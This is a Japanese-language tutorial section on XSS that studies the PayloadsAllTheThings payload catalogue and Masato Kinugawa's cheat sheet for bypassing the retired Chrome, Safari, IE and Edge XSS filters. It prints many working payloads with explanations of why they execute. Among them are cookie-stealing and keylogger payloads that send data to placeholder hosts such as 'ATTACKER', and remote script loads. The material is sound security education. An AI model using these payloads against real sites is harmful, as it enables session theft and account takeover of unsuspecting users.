## ペイロード集とブラウザXSSフィルタ回避（Kinugawa）

前の節までで、XSS（Cross-Site Scripting＝攻撃者が用意した JavaScript を被害者のブラウザ上で実行させてしまう脆弱性）を「どういう発想で見つけ、どのコンテキストに刺すか」という枠組みを学んできました。この節では、その枠組みに肉付けをする **二つの実戦資料** を精読して統合します。

1. **PayloadsAllTheThings の XSS Injection**（swisskyrepo）——世界最大級の攻撃ペイロード（payload＝攻撃を成立させるために送り込む実際の入力文字列）カタログ。「この文脈ではどう書くか」を、コンテキスト（context＝ユーザー入力が最終的に置かれる場所と、そこでのブラウザの解釈規則）別に引くための辞書です。
2. **filterbypass**（Masato Kinugawa）——かつてブラウザに **組み込まれていた** XSS フィルタ（Chrome の XSS Auditor、IE / Edge の XSS Filter）を回避するためのチートシート。「ブラウザ自身が防ごうとした XSS を、どうやってすり抜けたか」を体系化した、フィルタ回避の教科書的アーカイブです。

この二つを合わせて読むと、この節の核心——**「ペイロードは文脈で選び、フィルタは仕組みの隙間で抜く」**——が見えてきます。目的は文字列の丸暗記ではありません。**なぜその文字列がブラウザで実行に至るのか**、すなわち HTML パーサ（構文解析器）の状態遷移、文字コード（charset）の再解釈、名前空間（namespace）の切り替え、JavaScript の型変換——という「仕組み」まで掘り下げます。これがフィルタや WAF（Web Application Firewall）に勝つための本当の武器になります。

> 本セクションの担当2資料（PayloadsAllTheThings XSS Injection、Kinugawa filterbypass）および補強2資料（XSS Filter Bypass Cheat Sheet、Fixed Bypass Archive）は、いずれも開放ネットワーク環境で直接取得できました。以下はその内容に基づく再構成です。

---

### 資料1: PayloadsAllTheThings — ペイロードは「文脈」で引く辞書

PayloadsAllTheThings（略称 PTAT）は、XSS に限らずあらゆる Web 脆弱性のペイロードを集めた巨大リポジトリです。その XSS Injection セクションは、まず XSS を三つに分類したうえで、注入できる文脈ごとにペイロードを整理しています。この資料の正しい使い方は、**「まず自分の入力がどの文脈に落ちているかを特定し、その文脈の欄からペイロードを選ぶ」** ことです。同じ `alert(1)` を出すのでも、置かれる場所によって「動く書き方」がまるで違うからです。

> 出典: PayloadsAllTheThings — XSS Injection README — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

#### 三分類の定義

PTAT は冒頭で XSS を「攻撃者がクライアントサイドスクリプトを他ユーザーの見るページに注入できる脆弱性」と定義し、三つの型を挙げます。

- **反射型 XSS（Reflected）**: 攻撃コードを含む URL などを被害者がクリックした「その場」で、レスポンスに反射（reflect）されたコードが実行される型。攻撃者がメールで悪意あるリンクを送り、クリック時に情報を盗む、という典型です。サーバーには攻撃コードが残りません。
- **保存型 XSS（Stored）**: 攻撃コードがサーバー側（DB など）に**保存**され、そのページを開いた**すべての閲覧者**に対して実行される型。ブログのコメント欄が典型で、影響範囲が最も広い。
- **DOM 型 XSS（DOM-based）**: サーバーを一切介さず、ブラウザ内の JavaScript が DOM（Document Object Model＝ページを構成する要素のツリー構造）を操作する過程で発生する型。`innerHTML` や `location` への代入が典型的な sink（シンク＝ユーザー入力が最終的に実行・解釈される危険な代入先）になります。

#### コンテキスト1: タグを丸ごと注入できる場合

入力が HTML 本文としてそのまま出力される（`<` `>` がエスケープされていない）最も恵まれた文脈です。好きなタグを書けるので、**スクリプトの入れ物になるタグ**を選ぶだけです。

```html
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
```

なぜ動くか: ブラウザの HTML パーサは `<script>` 開始タグを見つけると、`</script>` までを「テキスト」ではなく「実行すべき JavaScript」として扱う特別なモード（script data 状態）に入ります。出所が開発者か攻撃者かは問いません。2 行目 `<scr<script>ipt>` は、フィルタが文字列として `<script>` を検索・除去する実装に対する古典的回避です。フィルタが中央の `<script>` を丸ごと削除すると、残った `<scr` と `ipt>` が連結して `<script>` に**復元**されます——フィルタが見る「文字列」とブラウザが組み立てる「ツリー」のズレを突く手口の原型です。3 行目 `">` は、自分が属性値の中に落ちている場合に、まず属性と開始タグを閉じてから新タグを開くための脱出です。

現代のフィルタは真っ先に `<script` を弾くので、実戦の本命は次の**イベントハンドラ経由**です。

```html
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<body onload=alert(/XSS/.source)>
```

なぜ動くか: `<img src=x>` は「存在しない画像 x を読もうとして必ず失敗する」ため、失敗時に呼ばれる `onerror` が確実に発火します。`<script>` を一切使わずに JS を実行できるのが要点です。`String.fromCharCode(88,83,83)` は文字コードから `"XSS"` を組み立てる書き方で、`'XSS'` という**リテラル文字列**を検索するフィルタを越えます。`<svg/onload>` の `/`（スラッシュ）は、HTML パーサが空白の代わりにスラッシュも属性区切りとして許すことを利用し、`svg` と `onload` の間に空白を入れさせないフィルタを回避します。末尾の `//` は行コメントで、注入位置より後ろにあるゴミ（`>` など）をコメントアウトして構文エラーを防ぎます。`/XSS/.source` は正規表現リテラルの `.source` プロパティで文字列 `"XSS"` を得る書き方です。

**ユーザー操作を必要としない自動発火**ベクタは特に価値が高い。PTAT は HTML5 タグの自動発火型を多数収録しています。

```html
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<details/open/ontoggle="alert`1`">
```

なぜ動くか: `autofocus` は「表示時にこの要素へ自動でフォーカスを当てる」指示なので、`onfocus`（フォーカス取得時）と組み合わせると**ユーザーが何もしなくても**発火します。`onloadstart` はメディア読み込み開始、`<marquee>` の `onstart` はスクロール開始、`<details open ontoggle>` は開いた状態で描画された瞬間に発火します。``alert`1` `` はテンプレートリテラルで関数を呼ぶ書き方（タグ付きテンプレート）で、`(` `)` を禁止するフィルタを越えます。

さらに PTAT は、警戒の薄い**ポインタ / タッチ / 隠し要素**系イベントも挙げます。

```html
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<body ontouchstart=alert(1)>
<input type="hidden" accesskey="X" onclick="alert(1)">
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

なぜ動くか: `on*` ハンドラは何百種類もあり、ブラックリストで全部は数え切れません。`onpointer*` はマウス移動で、`ontouch*` はタッチ操作で発火。`type=hidden` は本来非表示ですが、`accesskey="X"` を付けると「Alt+Shift+X」等のショートカットで `onclick` を強制発火でき、`oncontentvisibilityautostatechange` は `content-visibility:auto` の描画最適化状態が変わった瞬間に発火します。いずれも「危険そうなハンドラ名」の網の目を抜ける新種です。

#### コンテキスト2: 属性値の中に落ちている場合

入力が既存タグの属性値 `value="..."` の中に出力される文脈です。まず引用符とタグを閉じて脱出するか、既存属性にイベントを継ぎ足します。DOM 由来の断片（`#` の後ろ＝フラグメント）も同様に扱えます。

```html
"><img src=/ onerror=alert(2)>
#"><img src=/ onerror=alert(2)>
```

なぜ動くか: `">` で現在の属性値と開始タグを閉じ、続けて新しいタグを開けば、属性コンテキストから HTML コンテキストへ**脱出**できます。フィルタが引用符 `"` をエスケープしていなければ成立します。

#### コンテキスト3: `<script>` 内の JavaScript 文字列に落ちている場合

サーバーが `var q = "ユーザー入力";` のように JS の文字列リテラルへ入力を埋め込む文脈です。タグを注入する必要はなく、**JS の構文を閉じて**式を足します。

```javascript
-(confirm)(document.domain)//
; alert(1);//
```

なぜ動くか: すでに JS 実行コンテキストの中にいるので `<script>` は不要です。`"` で文字列を閉じ（サーバー出力に応じて）、`-` や `;` で式・文を区切って自分のコードを続け、`//` で後続をコメントアウトします。`(confirm)(...)` のように括弧で包むのは、`confirm(` という連続を検出するフィルタを崩すためです。

#### 文字エンコーディングによる難読化——なぜ「別の書き方」で動くのか

PTAT の収録ペイロードの多くは、同じ意味を**別のエンコーディングで表現**してフィルタを抜きます。ここは「仕組み」の理解が必須です。

```html
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
<script>alert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
```

なぜ動くか: `&#x61;` は HTML 数値文字参照で、パーサが**属性値やテキストを読み込む段階で** `a` に復号します。つまり `&#X61;lert` はパース後に `alert` になる。重要なのは復号の**タイミングと場所**です。HTML 実体参照は「HTML 属性値の中」でしか復号されないので、`javascript:` スキームを実体参照で書いた `jav&#x61;script:` は href/data 属性でこそ効きますが、`<script>` タグ内の JS には効きません（HTML パーサは script data 状態では実体参照を復号しないため）。逆に `a`（Unicode エスケープ）や `\x61`（16 進エスケープ）は **JavaScript エンジンが**識別子・文字列として解釈するので、`<script>alert` は `alert` になります。**「どの層（HTML パーサ / JS エンジン / URL デコーダ）が、いつ、その表記を復号するか」** を分けて考えるのが、エンコーディング回避の原理です。

#### `javascript:` / `data:` スキームと制御文字

```
javascript:prompt(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
java%0ascript:alert(1)
java%09script:alert(1)
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

なぜ動くか: `href="javascript:..."` はリンクを踏むと URL 部分を JS として実行します。`%0D%0A`（CR/LF）や `%09`（タブ）、`%0a` は、ブラウザがスキーム名を判定する際に**無視・除去する制御文字**で、`java\nscript:` のように途中に挟んでも `javascript:` と認識されます。これで「`javascript:` という連続文字列」を探すフィルタを崩せます。`javascript://...%0a...` の `//` はコメント化しつつ改行で本体へ繋ぐ手口。`data:text/html,...` はレスポンスなしで HTML 文書を丸ごとインライン生成し、Base64 版はペイロードを一段隠します。

#### リモート読み込み・SVG/XML・CDATA

短いペイロード欄しかない時は、本体を外部から取り込みます。

```html
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
```

XML/SVG 文書としてパースされる文脈では、名前空間や CDATA を悪用できます。

```xml
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
```

なぜ動くか: `xmlns:something="http://www.w3.org/1999/xhtml"` で任意の接頭辞に XHTML 名前空間を割り当てると、`something:script` が実質 `script` 要素として扱われ、`script` という**タグ名そのもの**を弾くフィルタを回避します。CDATA セクション `<![CDATA[...]]>` は「この中は生テキスト」という宣言ですが、サニタイザが CDATA を解いて再パースすると、内側の `</desc><script>` が有効なタグへ**変異（mutation）**します——これが後章で詳述する mXSS の入口です。PTAT はこの短い例も収録しています。

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

なぜ動くか: `<noscript>` はスクリプト有効時と無効時でパース規則が変わる要素で、この差を使うと属性値の中に書いたはずの `</noscript><img ...>` がタグ境界を跨いで有効化されます。典型的な mXSS です。

#### 情報窃取・ブラインド XSS・ツール

XSS が「実行できる」ことを確認したら、次は目的（Cookie 窃取、キーロガー、フィッシング）です。PTAT は実物を並べます。

```html
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>fetch('https://ATTACKER', {method:'POST', mode:'no-cors', body:document.cookie});</script>
<img src=x onerror='document.onkeypress=function(e){fetch("http://ATTACKER/?k="+String.fromCharCode(e.which))},this.remove();'>
```

なぜ動くか: `new Image().src=...` は画像リクエストを装って任意ドメインへ GET を飛ばし、URL 末尾に Cookie を付けて外部送信します（古典的 exfiltration）。`fetch(..., {mode:'no-cors'})` はレスポンスを読めない代わりに CORS 制限なく POST でき、本文に Cookie を乗せて送れます。`document.onkeypress` はキー入力を横取りするキーロガーです。なお `HttpOnly` 付き Cookie は `document.cookie` で読めないため、この手の窃取は無効になります（防御側の要点）。

保存先が見えない**ブラインド XSS**（管理画面など、自分では結果を見られない箇所での発火）には、外部の受信サーバーへスクリプトを読みに行かせます。

```html
"><script src="https://js.rip/ATTACKER"></script>
<script>$.getScript("//ATTACKER")</script>
```

PTAT は最後に、自動化ツール（XSStrike、Dalfox、XSpear、domdig、ezXSS など）と学習リソース（LiveOverflow「DO NOT USE alert(1) for XSS」、Cure53 の DOMPurify 研究など）を列挙し、防御としては「入力の検証・サニタイズ」に加え、**出力コンテキストに応じたエスケープ**と、ユーザー生成コンテンツを別ドメイン（sandbox domain）へ隔離する設計を推奨しています。

---

### 資料2: filterbypass（Kinugawa） — ブラウザ組み込みXSSフィルタの回避

PTAT が「アプリ開発者が書いたフィルタ」を抜く辞書だったのに対し、Masato Kinugawa（クロスサイトスクリプティング研究の第一人者。Cure53 所属で、数々のブラウザ脆弱性を報告してきた研究者）の **filterbypass** リポジトリは、**ブラウザ自身に組み込まれていた XSS 防御機構**を抜く技術を体系化したものです。GitHub で約 1.2k スター、ペンテスト・セキュリティ研究コミュニティで広く参照されてきました。中核は Wiki の 2 ページ、「Browser's XSS Filter Bypass Cheat Sheet」と「Fixed Bypass Archive」です。

> 出典: masatokinugawa/filterbypass — https://github.com/masatokinugawa/filterbypass

#### まず「ブラウザXSSフィルタ」とは何だったか、そして今どうなったか

反射型 XSS 対策として、かつてブラウザには「**リクエストに含まれる文字列**（URL パラメータ等）が、**レスポンスの HTML にほぼそのまま反射**していたら、それを反射型 XSS の疑いと見なして無害化する」機構が入っていました。代表が Chrome / Safari の **XSS Auditor** と、IE / Edge の **XSS Filter** です。歴史は次のとおりです。

- **2008 年**: Microsoft が Internet Explorer 8 で XSS Filter を初導入。`X-XSS-Protection` ヘッダで制御。
- **2010 年頃〜**: Chrome / Safari（WebKit/Blink）が同種の **XSS Auditor** を実装。
- **2018 年 7 月 25 日**: Microsoft が Edge の XSS Filter 廃止を表明（Windows 10 RS5 / 2018 年 10 月更新で削除）。
- **2019 年 8 月 5 日**: Google が Chrome 78 で **XSS Auditor を完全削除**すると告知。理由は「クロスサイトの情報漏えい（XS-Leaks）を新たに生む副作用があり、かつ回避手法が広く知られてしまった」ため。

> つまり **本節で扱うブラウザ XSS フィルタは、2018〜2019 年にすべて廃止済みの機構**です。現行のどのブラウザにも入っていません。`X-XSS-Protection` ヘッダも非推奨で、現代の反射型 XSS 対策の中心は CSP（Content Security Policy）と適切な出力エスケープに移りました。

> 出典: Goodbye XSS Auditor（Invicti / Chromium）— https://www.chromium.org/developers/design-documents/xss-auditor/ ／ Deprecations and removals in Chrome 78 — https://developer.chrome.com/blog/chrome-78-deps-rems ／ An Update on the Edge XSS Filter — https://textslashplain.com/2018/11/06/an-update-on-the-edge-xss-filter/

##### では、なぜ今なお学ぶ価値があるのか

廃止された機構でも、Kinugawa のチートシートには**設計上の普遍的教訓**が詰まっています。

1. **「反射している文字列を機械的に消す」方式は必ず破れる**。フィルタが見る「送信バイト列」と、ブラウザが最終的に描画する「HTML ツリー」は、文字コードの再解釈・パーサのエラー回復・名前空間の切替によって**一致しない**。この非対称性は、今の WAF や自作サニタイザにもそのまま当てはまります。
2. **フィルタは新たな脆弱性を生む**。Auditor が「消す」ことでかえって別の攻撃面（後述の character deletion/substitution）や情報漏えいを作った——「防御機構を足すと攻撃面が増える」という逆説の実例です。
3. **文字コードとパーサの境界こそ主戦場**。ISO-2022-JP、HZ-GB-2312、UTF-7、x-chinese-cns といった charset 依存の回避は、mXSS や現代のサニタイザ回避と同じ原理で動きます。

Kinugawa のチートシートは各項目を「**Unprotected**（そもそもフィルタが守っていなかった＝設計上の穴）」と「**Bypass**（本来守るはずなのに抜けた＝実装のバグ）」に分けている点が秀逸です。以下、原典の実例で見ていきます。

> 出典: Browser's XSS Filter Bypass Cheat Sheet — https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet

#### XSS Auditor（Chrome / Safari）が「そもそも守っていなかった」穴（Unprotected）

Auditor は「リクエストの文字列がレスポンスに反射する反射型」だけを対象にしていました。したがって**構造的に守れない**ケースがあります。

```html
<!-- (1) 文字列リテラル内に落ちる注入は対象外 -->
<script>var q="";alert(1)//</script>

<!-- (2) href の javascript: だけの注入も対象外 -->
<a href="javascript:alert(1)">Link</a>

<!-- (3) DOM 型（document.write 以外）は対象外 -->
document.body.innerHTML=decodeURIComponent(hash);

<!-- (4) 複数の注入ポイントを跨ぐもの（意図的に非対象。Chromium bug #96616, #403636） -->
<div>`-alert(1)</script><script>`</div>
```

なぜ抜けるか: Auditor の設計は「危険な**タグやハンドラの丸ごとの反射**」を探すものでした。(1) のように既に開いている `<script>` の**文字列リテラル内**へ入る注入は、新しいタグを作らないので検知対象外。(3) の DOM 型は、そもそもサーバーレスポンスに反射しない（クライアント JS が組み立てる）ので Auditor の視界の外。設計思想の外側は、バグですらなく最初から素通しなのです。

さらに、Auditor が「消す」動作そのものが攻撃面を作りました（character manipulation）。

```html
<!-- 削除で新ベクタが生成される -->
<svg o<script>nload=alert(1)>   →  <svg onload=alert(1)>
<!-- 置換で新ベクタが生成される -->
<script>/&/-alert(1)</script>   →  <script>/&amp;/-alert(1)</script>
```

なぜ抜けるか: Auditor は反射した危険部分（`<script>`）を検出して**削除**しますが、削除後の残骸 `<svg o` + `nload=alert(1)>` が連結して `<svg onload=...>` という**新しい有効なベクタ**に化けます。「防御が攻撃を生む」典型です。

#### XSS Auditor の実際のバイパス（Bypass）——文字コードと同一オリジン資源

ここからは「本来守るはずが抜けた」実装バグです。

```html
<!-- ISO-2022-JP のエスケープシーケンスでパーサと Auditor の見え方をズラす -->
<meta charset=iso-2022-jp>
<svg o<ESC>(Bnload=alert(1)>
```

なぜ抜けるか: `<ESC>(B`（バイト列 `0x1B 28 42`）は ISO-2022-JP の「ASCII に戻る」エスケープシーケンスで、**HTML パーサはこれを無視して読み飛ばし** `<svg onload=...>` を組み立てます。ところが Auditor は別の段階でバイト列を見るため、`o<ESC>(Bnload` を「`onload` ではない別物」と誤認して見逃す。**同じバイト列を、パーサと防御機構が違う文字コードで解釈する**——charset 起因のズレの教科書例です。

```html
<!-- 同一オリジンの資源を読み込ませる（Auditor はクエリ無しの同一オリジン取得を止めない） -->
<script src=/bypass/usercontent/xss.js></script>
<!-- 同一オリジンのフレームワークを悪用（Angular テンプレートインジェクション） -->
<script src="/js/angular1.6.4.min.js"></script><p ng-app>{{constructor.constructor('alert(1)')()}}</p>
<!-- 同一オリジンの jQuery + DOM Clobbering -->
<form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
```

なぜ抜けるか: Auditor は「反射した**外部**スクリプトの読み込み」を主眼にしており、**クエリ文字列を持たない同一オリジンの `<script src>`** は原則ブロックしませんでした。そこでアップロード済みの自ファイルや、サイトに元からある Angular / jQuery を「部品（gadget）」として呼び出し、`{{constructor.constructor('alert(1)')()}}`（Angular のサンドボックス脱出テンプレート式）でコード実行します。フィルタは「タグの反射」しか見ておらず、既存フレームワークの悪用は視界の外——後章の「gadget を使った CSP バイパス」と同じ発想の原型です。

Safari 固有のバグも多数あります（いずれも当時のバージョンで有効）。

```html
<!-- SVG animate の values に全角スペース + javascript: を混ぜる（Safari） -->
<svg xmlns:xlink=http://www.w3.org/1999/xlink>
<animate xlink:href=#x attributeName="xlink:href" values="&#x3000;javascript:alert(1)" />
<a id=x><rect width=100 height=100 /></a>

<!-- 複数の NULL バイトでパースを混乱させる（Safari） -->
[0x00]×7<script>alert(1)</script>

<!-- 未完の base タグで相対 URL の解決先を攻撃者側へ（Safari） -->
<div><embed allowscriptaccess=always src=/xss.swf><base href=//cors.l0.cm/</div><script src=/test.js></script>
```

なぜ抜けるか: いずれも「Auditor が検査する時点」と「Safari が実際にパース・解決する時点」で、値の解釈が食い違うことを突いています。`&#x3000;`（全角スペース）や NULL バイトは、Auditor には「javascript URL ではない」ように見え、Safari パーサには無害な空白として除去され `javascript:alert(1)` が残ります。

#### IE / Edge XSS Filter のバイパス——Referer・名前空間・文字コード

IE / Edge の Filter も同様に、Unprotected（文字列リテラル、全 DOM 型、複数注入点）を持ちつつ、実装バグで抜けました。特徴的なのが **Referer による無効化**です。

```html
<!-- 同一ドメインからのリンクだと Filter が無効化される -->
<a href="https://vulnerabledoma.in/bypass/text?q=<script>alert(1)</script>">Click</a>
<!-- iframe を自己参照させて同一 Referer を作り Filter を無効化 -->
<iframe onload="contentWindow[0].location='//vulnerabledoma.in/bypass/text?q=<script>alert(location)</script>'"
 src="//vulnerabledoma.in/bypass/text?q=%3Ciframe%3E"></iframe>
```

なぜ抜けるか: IE / Edge は「同一ドメイン内の遷移や localhost からのアクセスでは XSS Filter を無効化する」仕様でした（正規の同一サイト内リンクを誤検知しないための配慮）。攻撃者は**被害サイト自身の中に**リンクや自己参照 iframe を作れば、Referer が同一ドメインになり Filter が黙るのです。「例外規定が抜け道になる」教訓。

名前空間・文字コードのズレも多彩です。

```html
<!-- Edge: 名前空間もどきの記法で embed を script と誤認させる -->
<embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>

<!-- IE: nosniff 欠如で XML として sniff させ名前空間でバイパス -->
<?xml version="1.0"?>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1&#x29;);</x:script>

<!-- IE: UTF-7 BOM を送り込みページのエンコーディングを再解釈させる -->
+/v8-+ADw-script+AD4-alert(1)+ADw-/script+AD4-

<!-- IE/Edge: 遷移時のエンコーディング不一致（x-chinese-cns） -->
<meta charset=utf-8>
<script>
 document.charset="x-chinese-cns";
 location="https://vulnerabledoma.in/bypass/text?q=<script/旡alert(1)</script/旡"
</script>

<!-- IE/Edge: CSS 内の実体参照を Filter が無視する -->
<svg><style>&commat;import'//attacker'</style>
<svg><style>@&bsol;0069mport'//attacker'</style>
```

なぜ抜けるか: `+ADw-` は UTF-7 で `<` を表すシーケンスで、`+/v8-`（UTF-7 の BOM）を先頭に置くと、`X-Content-Type-Options: nosniff` が無い応答で IE がページを **UTF-7 と再解釈**します。すると Filter が検査したバイト列（`+ADw-script...`）と、ブラウザが描画する文字（`<script...`）が食い違い、Filter は「script タグが無い」と判断して素通し。x-chinese-cns の例も同じ原理で、`旡`（0xA13E）が送信時のエンコーディングと Filter の解釈で違う文字に化けます。`&commat;`（＝`@`）や `&bsol;`（＝`\`）は、Filter が CSS 内の実体参照を復号せず素通しするのを突いて `@import` を隠します。**「防御機構がどの層で文字を見るか」を一段ズラせば必ず破れる**——チートシート全体を貫く原理です。

#### Fixed Bypass Archive——「修正された穴」の博物館

Wiki のもう一つのページ「Fixed Bypass Archive」は、上記のうち**すでに各ブラウザで修正されたバイパス**を、修正バージョン付きで記録したものです。代表例（原典の記載）:

- **SVG animate の values 属性**（Chrome 59〜62 で修正）: `<svg><animate href=#x attributeName=href values=&#x3000;javascript:alert(1) /><a id=x>`
- **未完の script タグ閉じ**（Chrome 61 で修正）: `<script>alert(1)</script `（末尾に空白）
- **複数 NULL バイト**（Chrome 62 で修正）: `[0x00]×7<script>alert(1)</script>`
- **script 内の HTML コメント構文**（Chrome 62 で修正）: `<script>alert(1)\n--></script>`
- **未完の form タグ**（Chrome 62 で修正）: `"></form><form action=https://attacker/`（フォーム送信先を乗っ取る）
- **object + param（Flash 前提）**（Chrome 64 で修正）
- **未完の base タグ + リンク**（Chrome 65 で修正）
- **Edge の Referer 詐称バグ**（2018 年 4 月修正）

> 出典: Fixed Bypass Archive — https://github.com/masatokinugawa/filterbypass/wiki/Fixed-Bypass-Archive

このアーカイブの価値は、**「一つ塞いでも、パーサの別状態・別文字コードから必ず次の穴が出る」**という、いたちごっこの記録そのものにあります。修正バージョンが Chrome 59→61→62→64→65 と刻まれていく様子は、ブラックリスト的防御の限界を可視化しています。最終的にベンダー自身が「これは原理的に守りきれず、しかも副作用がある」と結論して機構ごと撤去した——これが 2018〜2019 年の廃止の背景です。

---

### この節のまとめ——「文脈」と「層のズレ」

二つの資料は、抽象度の異なる同じ真実を語っています。

- **PTAT の教訓**: XSS ペイロードは丸暗記するものではなく、**自分の入力が落ちるコンテキスト（HTML 本文／属性値／JS 文字列／URL／CSS／XML）を特定し、そこで復号・実行される表記を選ぶ**もの。エンコーディング回避が効くかどうかは、「どの層がいつその表記を復号するか」で決まります。
- **filterbypass の教訓**: 反射文字列を機械的に消す防御は、**フィルタが見るバイト列とブラウザが組み立てる HTML ツリーのズレ**（文字コード再解釈・パーサのエラー回復・名前空間切替・Referer 例外）によって必ず破れる。ブラウザベンダーですら 10 年かけて諦めた。だからこそ現代の対策は、パターン検出（ブラックリスト）ではなく、**出力コンテキストに応じたエスケープ**と **CSP** による多層防御へ移りました。

次節以降で扱う mXSS、Trusted Types、CSP バイパスは、いずれもここで見た「層のズレ」を、より深い場所で突く技術です。本節の「なぜ動くか」を土台に読み進めてください。
